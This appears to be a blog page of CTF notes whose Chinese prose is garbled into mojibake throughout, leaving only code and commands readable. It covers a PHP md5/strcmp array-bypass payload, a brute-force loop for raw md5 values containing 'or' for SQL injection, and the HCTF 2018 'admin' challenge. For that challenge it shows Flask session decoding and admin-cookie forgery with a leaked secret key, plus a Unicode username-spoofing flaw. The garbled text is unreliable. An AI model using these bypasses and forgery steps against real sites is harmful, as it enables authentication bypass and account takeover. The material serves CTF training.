<p>å¼ºç±»å‹æ¯”è¾ƒï¼Œéœ€è¦1.å¼ºç¢°æ’ï¼š<strong>æ‰¾åˆ°ä¸¤ä¸ªmd5å€¼ç›¸åŒçš„å­—ç¬¦ä¸²å³å¯</strong>/2.ç»•è¿‡ï¼š<strong>æ•°ç»„ç»•è¿‡</strong></p>
<pre><code class="hljs php">md5(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>

<span class="hljs-comment">//æ›´å¤šï¼š</span>
sha1(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>    
ereg(pattern,<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span> vs preg_match(pattern,<span class="hljs-keyword">array</span>) = <span class="hljs-literal">false</span>
strcmp(<span class="hljs-keyword">array</span>(), <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span>
strpos(<span class="hljs-keyword">array</span>(),<span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span></code></pre>
<p>payloadï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">2</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222002727828.png" srcset="/img/loading.gif" alt="image-20220222002727828" style="zoom: 67%;"></p>
<h4 id="å¦‚ä½•æ‰¾åˆ°ç‰¹å®šå¼€å¤´çš„md5å€¼">å¦‚ä½•æ‰¾åˆ°ç‰¹å®šå¼€å¤´çš„md5å€¼ï¼Ÿ</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12535534.html">**å¤§ä½¬åšå®¢</a></p>
</blockquote>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>;;) &#123; 
 <span class="hljs-keyword">for</span> ($c = <span class="hljs-number">0</span>; $c &lt; <span class="hljs-number">1000000</span>; $c++, $i++)
  <span class="hljs-keyword">if</span> (stripos(md5($i, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5($i, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span>

<span class="hljs-comment">//å¼•ç”¨äº http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></code></pre>
<h2 id="hctf-2018admin">[HCTF 2018]admin(**)</h2>
<h4 id="è€ƒç‚¹flaskå®¢æˆ·ç«¯sessionä¼ªé€ ">è€ƒç‚¹:flaskã€å®¢æˆ·ç«¯sessionä¼ªé€ </h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/100733581">csdnä¸‰ç§è§£æ³•WP</a></p>
<p>æ›´å¤šï¼š<a target="_blank" rel="noopener" href="https://inhann.top/2021/02/25/flask_newer/">flaskæ¼æ´åˆ©ç”¨å°ç»“</a></p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679"><strong>è¯¦ç»†ï¼Œæ˜“æ‡‚ï¼Œé€‚åˆå°ç™½+CTFå„ç§è¿‡æ»¤ç»•è¿‡å§¿åŠ¿</strong></a></p>
</blockquote>
<h4 id="flask">Flask</h4>
<p>==Flask==ï¼šä¸€ä¸ªç”¨Pythonç¼–å†™çš„è½»é‡çº§Webåº”ç”¨æ¡†æ¶ã€‚åŸºäºWerkzeug
WSGIå·¥å…·ç®±å’ŒJinja2æ¨¡æ¿å¼•æ“ã€‚</p>
<p>å‚è€ƒï¼šhttps://www.jianshu.com/p/d537d634df7b</p>
<p>â€‹ æ€»ç»“ä¸€ä¸‹ï¼ŒFlaskå¤„ç†ä¸€ä¸ªè¯·æ±‚çš„æµç¨‹å°±æ˜¯ï¼Œé¦–å…ˆæ ¹æ® URL
å†³å®šç”±é‚£ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œç„¶ååœ¨å‡½æ•°ä¸­è¿›è¡Œæ“ä½œï¼Œå–å¾—æ‰€éœ€çš„æ•°æ®ã€‚å†å°†æ•°æ®ä¼ ç»™ç›¸åº”çš„æ¨¡æ¿æ–‡ä»¶ä¸­ï¼Œç”±Jinja2
è´Ÿè´£æ¸²æŸ“å¾—åˆ° HTTP å“åº”å†…å®¹ï¼Œç„¶åç”±Flaskè¿”å›å“åº”å†…å®¹ã€‚</p>
<ul>
<li><p>æ³¨æ„</p>
<p>render_template()æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶çš„ã€‚ä½¿ç”¨å¦‚ä¸‹ï¼šreturn
render_template('index.html')
render_template_stringåˆ™æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªå­—ç¬¦ä¸²çš„ã€‚<strong>SSTIä¸è¿™ä¸ªæ–¹æ³•å¯†ä¸å¯åˆ†</strong>ã€‚</p></li>
</ul>
<p>â€‹
<strong>ç®€å•æ¥è¯´ä¹Ÿå°±æ˜¯ä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„render_template_stringæ–¹æ³•ä¼šå¼•å‘SSTIã€‚</strong></p>
<ol type="1">
<li><strong>æ ¹æ®é¢˜ç›®æç¤ºçš„admin,çŒœæµ‹æ˜¯ä¸æ˜¯è¦è®©æˆ‘ç”¨adminæ¥ç™»å½•è¿™ä¸ªç½‘ç«™ï¼Ÿç„¶åæˆ‘åœ¨loginç•Œé¢è¾“å…¥ç”¨æˆ·åâ€adminâ€œ,å¯†ç â€123â€œï¼ˆå¼±å£ä»¤ï¼‰ç»“æœæˆåŠŸç™»å½•å¾—åˆ°flag</strong></li>
<li>å¸¸è§„åšæ³•ï¼šå…ˆæ³¨å†Œç”¨æˆ·ï¼Œç™»å½•ç”¨æˆ·ååœ¨ä¿®æ”¹å¯†ç æŸ¥çœ‹æºç ï¼Œå‘ç°æç¤ºflask==&gt;æ¡†æ¶ï¼Œä»GitHubä¸Šdownæºç </li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223143114609.png" srcset="/img/loading.gif" alt="image-20220223143114609"></p>
<ol start="3" type="1">
<li><p>çœ‹åˆ°æºç å°è¯•æ¨¡æ¿æ³¨å…¥ï¼Œæ³¨å†Œç”¨æˆ·æ—¶regester.htmlæœ‰åŒå¤§æ‹¬å·</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184440886.png" srcset="/img/loading.gif" alt="image-20220304184440886" style="zoom: 67%;"></p>
<p>å‘ç°ä¸è¡Œï¼Œå¹¶ä¸å“åº”</p></li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184231019.png" srcset="/img/loading.gif" alt="image-20220304184231019" style="zoom:50%;"></p>
<p>è€Œæ‰€æœ‰çš„ä¼ å‚forméƒ½ç»è¿‡äº†NewpasswordFormï¼Œè½¬åˆ°å®šä¹‰ï¼Œçœ‹ä¸å‡ºæ¥å•¥ï¼ŒçŒœæµ‹æ˜¯è¢«è¿‡æ»¤äº†==ã€‹åç»­æŸ¥çœ‹æ¨¡æ¿æ³¨å…¥ï¼Œå‘ç°<strong>åªæœ‰render_template_stringä¼šå¯¼è‡´æ³¨å…¥</strong>ï¼Œè€Œä¸”æ¨¡æ¿æ–‡ä»¶è‹¥å·²æœ‰<code>{{}}`,åˆ™æ— æ³•äº§ç”Ÿæ³¨å…¥ï¼Œè€Œæ¨¡æ¿è¯­è¨€æ— `{{}}</code>ï¼Œè¾“å…¥å‚æ•°å¯ä»¥<code>{{}}`çš„è¯å°±å¯ä»¥ï¼Œå‚è€ƒhttps://xz.aliyun.com/t/3679

> **ä¸¤ç§ä»£ç çš„å½¢å¼æ˜¯ï¼Œä¸€ç§å½“å­—ç¬¦ä¸²æ¥æ¸²æŸ“å¹¶ä¸”ä½¿ç”¨äº†%(request.url)ã€å‚æ•°å¯æ§ã€‘ï¼Œå¦ä¸€ç§è§„èŒƒä½¿ç”¨index.htmlæ¸²æŸ“æ–‡ä»¶ã€‚æˆ‘ä»¬æ¼æ´ä»£ç ä½¿ç”¨äº†render_template_stringå‡½æ•°ï¼Œè€Œå¦‚æœä½¿ç”¨render_templateå‡½æ•°ï¼Œå°†urlé‡Œå†™è‡ªå·±æƒ³è¦çš„æ¶æ„ä»£ç `{{}}</code>ä¼ å…¥è¿›å»å¹¶ä¸ä¼šæ‰§è¡Œã€è‰¯å¥½çš„ä»£ç è§„èŒƒï¼Œä½¿å¾—æ¨¡æ¿å…¶å®å·²ç»å›ºå®šäº†ï¼Œå·²ç»è¢«render_templateæ¸²æŸ“äº†ï¼Œå‚æ•°å·²ç»ä¸å¯æ§ã€‘**</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304185102492.png" srcset="/img/loading.gif" alt="image-20220304185102492" style="zoom:67%;"></p>
<ol start="3" type="1">
<li>æŸ¥çœ‹æºç ï¼Œåœ¨index.htmlå¾—åˆ°flagçš„ç›¸å…³ä¿¡æ¯</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223145017072.png" srcset="/img/loading.gif" alt="image-20220223145017072" style="zoom: 50%;"></p>
<p>è¦æ±‚current_user.is_authenticated and session['name'] == 'admin'</p>
<h4 id="flask_sessionä¼ªé€ ">flask_sessionä¼ªé€ </h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">å®¢æˆ·ç«¯
session å¯¼è‡´çš„å®‰å…¨é—®é¢˜ã€flask</a></p>
<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/02/01/Flask%E5%AE%A2%E6%88%B7%E7%AB%AFsession%E4%BC%AA%E9%80%A0/">Flaskå®¢æˆ·ç«¯sessionä¼ªé€ </a></p>
</blockquote>
<p><strong>ä¸€èˆ¬sessionä¼šè¢«ä¿å­˜åˆ°æœåŠ¡ç«¯ä¸­ï¼ˆæœåŠ¡ç«¯cookieï¼Œä½†æ˜¯flaskçš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„cookieé‡Œçš„</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/6277797-c018a4c5b5be1541.png" srcset="/img/loading.gif" alt="img"></p>
<blockquote>
<p>flaskå¯¹sessionçš„å¤„ç†ä½äºflask/sessions.pyä¸­ï¼ˆæœ¬é¢˜æ²¡æ‰¾åˆ°ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹flaskçš„sessionä»¥cookieçš„å½¢å¼ä¿å­˜äºå®¢æˆ·ç«¯ï¼Œåˆ©ç”¨ç­¾åæœºåˆ¶æ¥é˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚</p>
</blockquote>
<p>sessionä¸€èˆ¬æ ¼å¼ï¼š</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/t01ef54ad8392df284d.png" srcset="/img/loading.gif" alt="img"></p>
<pre><code class="hljs gcode">.eJwljrFuwzAMBf<span class="hljs-number">9</span>FcwZSpkQyP<span class="hljs-number">2</span><span class="hljs-symbol">NQoh5</span>aBGgB<span class="hljs-meta">O5</span>mC_Hs<span class="hljs-symbol">NdLy75</span>d<span class="hljs-number">5</span>lx<span class="hljs-number">7</span>HOr<span class="hljs-number">3</span>J_Hq<span class="hljs-number">91</span>K_t<span class="hljs-number">3</span>l<span class="hljs-symbol">nuxGamDI6</span>kmLPpa<span class="hljs-number">1</span>TE<span class="hljs-number">0</span>UKteyYSpJyaaVJ<span class="hljs-number">8</span>hRGZDk<span class="hljs-number">7</span>ZtLlEbpALjxjOc<span class="hljs-number">1</span>SaZWzLSx-aB<span class="hljs-number">3</span>p<span class="hljs-number">0</span>djSta<span class="hljs-number">984</span>kjXqMrQqrE<span class="hljs-number">3</span>WhBM<span class="hljs-meta">o18</span>jrX<span class="hljs-number">8</span>X_D<span class="hljs-number">9</span>eJ<span class="hljs-number">5</span>Htifv<span class="hljs-number">4</span>_<span class="hljs-number">1</span>cxltCgQ<span class="hljs-number">3</span>V<span class="hljs-number">0</span>zvIsGBjDAlGQsq<span class="hljs-symbol">NJEi08</span>v<span class="hljs-symbol">nD15</span>kP<span class="hljs-number">8</span>Q.XxKIMg.iW<span class="hljs-number">96</span>TDgIamKLQ<span class="hljs-number">0</span>x<span class="hljs-number">9</span>h<span class="hljs-number">5</span>LoPsUCIvw</code></pre>
<p>é€šè¿‡.éš”å¼€çš„<strong>3æ®µå†…å®¹</strong>ï¼Œç¬¬ä¸€æ®µå…¶å®å°±æ˜¯base64
encodeåçš„å†…å®¹ï¼Œä½†å»æ‰äº†å¡«å……ç”¨çš„ç­‰å·ï¼Œè‹¥decodeå¤±è´¥ï¼Œè‡ªå·±éœ€è¦è¡¥ä¸Š1-3ä¸ªç­‰å·è¡¥å…¨ã€‚ä¸­é—´å†…å®¹ä¸ºæ—¶é—´æˆ³ï¼Œåœ¨flaskä¸­æ—¶é—´æˆ³è‹¥è¶…è¿‡31å¤©åˆ™è§†ä¸ºæ— æ•ˆã€‚æœ€åä¸€æ®µåˆ™æ˜¯å®‰å…¨ç­¾åï¼Œå°†sessiondata,æ—¶é—´æˆ³ï¼Œå’Œflaskçš„secretkeyé€šè¿‡sha1è¿ç®—çš„ç»“æœã€‚</p>
<pre><code class="hljs php">json-&gt;zlib-&gt;base64åçš„æºå­—ç¬¦ä¸² . æ—¶é—´æˆ³ . hmacç­¾åä¿¡æ¯</code></pre>
<ul>
<li><p>æœåŠ¡ç«¯æ¯æ¬¡æ”¶åˆ°cookieåï¼Œä¼šå°†cookieä¸­å‰ä¸¤æ®µå–å‡ºå’Œsecretkeyåšsha1è¿ç®—ï¼Œè‹¥ç»“æœä¸cookieç¬¬ä¸‰æ®µä¸ä¸€è‡´åˆ™è§†ä¸ºæ— æ•ˆã€‚</p></li>
<li><p>æ¼æ´æˆå› 
æ¼æ´çš„æ ¹æºæ˜¯<strong>secretkeyè¢«è·å–</strong>ï¼Œåº”å½“ä½¿ç”¨å®Œå…¨éšæœºçš„secretkeyï¼Œæˆ–åœ¨cloneæŸé¡¹ç›®åä¿®æ”¹ä¸ºéšæœºçš„keyã€‚
<strong>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯python2ä¸python3ä¸‹äº§ç”Ÿçš„timestampæ˜¯ä¸ä¸€æ ·çš„ï¼</strong></p></li>
<li><p>==ç”Ÿæˆ session cookie éœ€è¦ secret_key è§£ç  session cookie
å¯ä»¥ä¸éœ€è¦ secret_key==</p></li>
<li><p><strong>åˆ©ç”¨å·¥å…·ï¼š</strong></p></li>
</ul>
<p>â€‹ https://github.com/noraj/flask-session-cookie-manager</p>
<p>â€‹
<strong>ç”±ä¸Šæ–‡æ‰€è¿°çš„sessionæ ¼å¼å¯çŸ¥ï¼Œè¦ä¿®æ”¹å¹¶ä¼ªé€ ä¸€ä¸ªsessionçš„å¿…è¦æ¡ä»¶å°±æ˜¯çŸ¥é“åŠ å¯†æ‰€é‡‡ç”¨çš„</strong><code>secret_key</code><strong>ï¼Œä¸€æ—¦è·å–åˆ°</strong><code>secret_key</code><strong>,
æˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„æ„é€ ç­¾åï¼Œä»è€Œå®ç°å®¢æˆ·ç«¯çš„sessionçš„ä¼ªé€ ã€‚</strong></p>
<ul>
<li><strong>å®‰è£…é—®é¢˜</strong>ï¼š<a target="_blank" rel="noopener" href="https://chenlvtang.top/2020/07/28/Flask%E3%81%AE%E5%88%9D%E8%AF%86/">å‚è€ƒåšå®¢</a>ï¼Œå®‰è£…å®Œåå‡ºç°helloworldåé€€å‡ºè™šæ‹Ÿç¯å¢ƒï¼Œç›´æ¥è¿è¡Œè„šæœ¬ã€æ³¨æ„ï¼Œè™šæ‹Ÿç¯å¢ƒé‡Œè®¾ç½®çš„è„šæœ¬æ˜¯python.exeæ‰€ä»¥ç”¨æ³•æ˜¯python
flask_xxxè€Œä¸æ˜¯python3 flask_xxxã€‘</li>
</ul>
<p>cmdç›´æ¥æ‰§è¡ŒæŸæ–‡ä»¶å¤¹ä¸‹çš„exeï¼š</p>
<pre><code class="hljs taggerscript">&quot;D:<span class="hljs-symbol">\W</span>ork<span class="hljs-symbol">\v</span>scode<span class="hljs-symbol">\M</span>icrosoft VS Code<span class="hljs-symbol">\_</span><span class="hljs-symbol">\C</span>ode.exe&quot;    //è·¯å¾„æœ‰ç©ºæ ¼æƒ…å†µä¸‹è¦åŠ ä¹¦æ˜‚å¼•å·</code></pre>
<p>ç”¨æ³•ï¼š</p>
<p>è§£å¯†:
<code>python flask_session_manager.py decode -s SECRET_KEY -c session</code></p>
<p>åŠ å¯†:
<code>python flask_session_manager.py encode -s SECRET_KEY -t æœªåŠ å¯†session</code></p>
<pre><code class="hljs python">åŠ å¯†ï¼šã€å¿…é¡»è¦æœ‰secret_keyã€‘
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py encode -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>
==ã€‹eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw

è§£å¯†ï¼šã€å¯æœ‰å¯æ— keyã€‘
æœ‰key:
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span>
==ã€‹&#123;<span class="hljs-string">u&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;number&#x27;</span>: <span class="hljs-string">&#x27;326410031505&#x27;</span>&#125;

æ— kwyï¼š
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span>
==ã€‹&#123;<span class="hljs-string">&quot;number&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</code></pre>
<p>æ³¨å†Œç”¨æˆ·abcï¼Œå¯†ç 123ï¼ŒF12æŠ“åŒ…å¾—åˆ°session</p>
<pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_<span class="hljs-number">751</span>F<span class="hljs-number">3</span>aP<span class="hljs-number">7837</span>HjPzYMtt<span class="hljs-number">154</span>cm<span class="hljs-number">5</span>y<span class="hljs-number">7</span>Sztiy_<span class="hljs-number">0</span>nmzzY<span class="hljs-number">25</span>pNGIiFt<span class="hljs-number">0</span>JG<span class="hljs-number">9</span>DBGtXAg<span class="hljs-number">6</span>rTUszH<span class="hljs-number">2</span>eV<span class="hljs-number">8</span>KGaB<span class="hljs-number">3</span>DgzcStME<span class="hljs-number">0</span>EXAWGUQc<span class="hljs-number">05</span>mIJT<span class="hljs-number">01</span>H<span class="hljs-number">8</span>EinVmReFQ<span class="hljs-number">15</span>y<span class="hljs-number">0</span>jcjzjEwRrK<span class="hljs-number">8</span>SVI<span class="hljs-number">23</span>Zn<span class="hljs-number">61</span>Hu<span class="hljs-number">7</span>WUIpi<span class="hljs-number">0</span>AoPKOSBTH<span class="hljs-number">5</span>DPcvA<span class="hljs-number">0</span>N<span class="hljs-number">3</span>qalyaeYZ<span class="hljs-number">6</span>l<span class="hljs-number">6</span>DecKvqd_IyoJhz<span class="hljs-number">0</span>HWKOkzZc<span class="hljs-number">8</span>Q<span class="hljs-number">2</span>p<span class="hljs-number">267</span>PH-F<span class="hljs-number">9</span>vh_Qmwc<span class="hljs-number">8</span>OoGfc<span class="hljs-number">3</span>RD<span class="hljs-number">1</span>EjA<span class="hljs-number">3</span>kb<span class="hljs-number">0</span>FMCrzUGPeDXUslIfeFRUQaz<span class="hljs-number">6</span>U_dPq<span class="hljs-number">527</span>V_T<span class="hljs-number">6</span>ugarH<span class="hljs-number">4</span>nx<span class="hljs-number">1</span>VsX<span class="hljs-number">9</span>Z<span class="hljs-number">6</span>w<span class="hljs-number">0</span>bscmq<span class="hljs-number">7</span>n<span class="hljs-number">6</span>-xNGHPbzbYaq<span class="hljs-number">0</span>.YiIR<span class="hljs-number">9</span>A.ANlJjD-W<span class="hljs-number">7</span>HclEQHya-wgAX<span class="hljs-number">8</span>O<span class="hljs-number">9</span>uo; HttpOnly; Path=/</code></pre>
<p>è¦ç”Ÿæˆsessionéœ€è¦secret_keyï¼Œæœç´¢ï¼Œåœ¨config.pyä¸­æ‰¾åˆ°secret_keyï¼šckj123</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304224727300.png" srcset="/img/loading.gif" alt="image-20220304224727300"></p>
<p>è§£å¯†å¤±è´¥ï¼š[Decoding error] Invalid base64-encoded data</p>
<p><span style="background:#FF9999;"><strong>æ³¨æ„ï¼šè§£å¯†çš„åºåˆ—ä¸²å‰çš„ç‚¹ï¼ˆ.ï¼‰ä¸èƒ½å°‘ï¼è€Œä¸”æœ€å¥½ç”¨åŒå¼•å·ã€æœ‰secret_keyä¸‹ç”¨keyå®Œå…¨è§£å¯†ï¼Œå¦åˆ™è§£å¯†å‡ºæ¥è¿˜æ˜¯base64çš„</strong></span></p>
<pre><code class="hljs bash">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&quot;.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo&quot;</span> -s ckj123

&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;2ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;jxU5&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;</code></pre>
<p>çœ‹åˆ°ç”¨æˆ·abc</p>
<p>æˆ–è€…å¯ä»¥ç›´æ¥ç”¨pç‰›çš„è§£å¯†è„šæœ¬ï¼Œæ— éœ€key</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305135431149.png" srcset="/img/loading.gif" alt="image-20220305135431149"></p>
<p>è¯•è¯•æ”¹ä¸ºadminï¼Œ+keyç”Ÿæˆsessionï¼š</p>
<pre><code class="hljs cmd">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;<span class="hljs-number">04</span>cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">2</span>ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;, &#x27;image&#x27;: b&#x27;jxU5&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;<span class="hljs-number">10</span>&#x27;&#125;&quot; -s ckj123

.eJxFkE-LwjAQxb_KkrOHNtteBA8uMaGFmVJJG5KL-KeaJqYLVVErfvetLuwe35v3e8zMg6z2fXOyZHruL82ErNodmT7Ix4ZMCbClM4wHdJCiWFpgVVzIeYpDNhSMexisBQW3QtUeZO4xlAmEjGo1EoI7PXx5HarEsNyirKiWJiDNEq1yb1wZoaidUYurcXA3SsfIRi3wiIwftcpuKOcJKH03skwLtUhQHiKUW2pE9akd98gWFGQVo_Qz8pyQ7anfr87fvun-Twi1BVreYKgoujGquNfOeHQ6gtcaox7xayF40EPuUOgE5rN3XRvWh-avad3ZGsvfSbcOzcvahbYjE3I5Nf37bySOyPMHEwhrkA.YiIoxQ.<span class="hljs-number">1</span>STJCvyLZME_COi7806tpsQssx4</code></pre>
<p>æäº¤ä¼ªé€ sessionå¾—åˆ°flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304225810232.png" srcset="/img/loading.gif" alt="image-20220304225810232" style="zoom: 67%;"></p>
<h4 id="unicodeæ¬ºéª—">unicodeæ¬ºéª—</h4>
<blockquote>
<p>å‚è€ƒï¼š</p>
<p>https://darkwing.moe/2019/11/04/HCTF-2018-admin/</p>
<p>æ›´å¤šï¼ŒåŒ…å«å…¶ä»–å­—ç¬¦æ¬ºéª—ï¼ˆ<strong>idna</strong>
ï¼‰+phpå˜é‡ç»•è¿‡ï¼šhttps://www.geek-share.com/detail/2798492491.html</p>
</blockquote>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°å„ç§æ“ä½œï¼šæ³¨å†Œï¼Œç™»å½•ï¼Œä¿®æ”¹å¯†ç ï¼Œéƒ½ä¼šå…ˆå¯¹ç”¨æˆ·åå°å†™</p>
<pre><code class="hljs fortran"><span class="hljs-keyword">name</span> = strlower(<span class="hljs-keyword">form</span><span class="hljs-number">.</span>username<span class="hljs-number">.</span><span class="hljs-keyword">data</span>)</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305140113647.png" srcset="/img/loading.gif" alt="image-20220305140113647" style="zoom:67%;"></p>
<p>å‡½æ•°å®šä¹‰ï¼š</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span>
    username = nodeprep.prepare(username)
    <span class="hljs-keyword">return</span> username</code></pre>
<p>è€Œnodeprepæ˜¯ä¸ªåº“ï¼Œfrom twisted.words.protocols.jabber.xmpp_stringprep
import
nodeprepï¼Œè€Œæºç å¯¼å…¥çš„ç‰ˆæœ¬æ˜¯10.2.0ï¼Œè€Œå®˜ç½‘æœ€æ–°çš„ç‰ˆæœ¬æ˜¯22.2.0ï¼Œè¿™ä¹ˆè€çš„ç‰ˆæœ¬è‚¯å®šä¼šæœ‰æ¼æ´</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141538923.png" srcset="/img/loading.gif" alt="image-20220305141538923" style="zoom:67%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141458847.png" srcset="/img/loading.gif" alt="image-20220305141458847"></p>
<ul>
<li>æ¼æ´æˆå› ï¼š</li>
</ul>
<p>unicodeé—®é¢˜ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œnodeprep.prepareä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œ</p>
<pre><code class="hljs clean">á´¬ -&gt; A -&gt; a
